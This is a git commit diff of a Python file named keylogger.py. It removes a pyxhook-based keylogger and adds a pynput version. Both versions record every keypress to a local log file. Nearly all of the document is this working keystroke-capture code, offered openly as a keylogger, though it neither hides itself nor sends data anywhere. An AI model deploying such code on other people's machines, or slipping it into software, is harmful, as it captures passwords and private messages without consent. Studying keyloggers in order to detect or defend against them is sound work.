fd7702d89037d15717f7c0e6360aa77d7915ec5f
Swaraj-122 <113718529+Swaraj-122@users.noreply.github.com>
2023-08-23 22:28:22 +0530

    keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,40 +1,28 @@
-# import needed modules
-import os
-from datetime import datetime
-import pyxhook
-
-def main():
-    # Specify the name of the file (can be changed )
-    log_file = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'
-
-    # The logging function with {event parm}
-    def OnKeyPress(event):
-
-        with open(log_file, "a") as f:  # Open a file as f with Append (a) mode
-            if event.Key == 'P_Enter' :
-                f.write('\n')
-            else:
-                f.write(f"{chr(event.Ascii)}")  # Write to the file and convert ascii to readable characters
-
-    # Create a hook manager object
-    new_hook = pyxhook.HookManager()
-    new_hook.KeyDown = OnKeyPress
-
-    new_hook.HookKeyboard()  # set the hook
-
-    try:
-        new_hook.start()  # start the hook
-    except KeyboardInterrupt:
-        # User cancelled from command line so close the listener
-        new_hook.cancel()
-        pass
-    except Exception as ex:
-        # Write exceptions to the log file, for analysis later.
-        msg = f"Error while catching events:\n  {ex}"
-        pyxhook.print_err(msg)
-        with open(log_file, "a") as f:
-            f.write(f"\n{msg}")
+from pynput.keyboard import Listener
 
 
-if __name__ == "__main__":
-    main()
+def write_to_file(key):
+    letter = str(key)
+    letter = letter.replace("'", "")
+
+    if letter == 'Key.space':
+        letter = ' '
+    if letter == 'Key.shift_r':
+        letter = ''
+    if letter == "Key.ctrl_l":
+        letter = ""
+    if letter == "Key.enter":
+        letter = "\n"
+
+    with open("log.txt", 'a') as f:
+        f.write(letter)
+
+# Collecting events until stopped
+
+with Listener(on_press=write_to_file) as l:
+    l.join()
+
+
+# 'with' will automatically close the listener. When we stop the program the memory allocated
+# to this listener won't be released. 'with' makes sure whatever happens, when an error is there
+# or the program stops the memory is released. It's just a good coding principle to follow
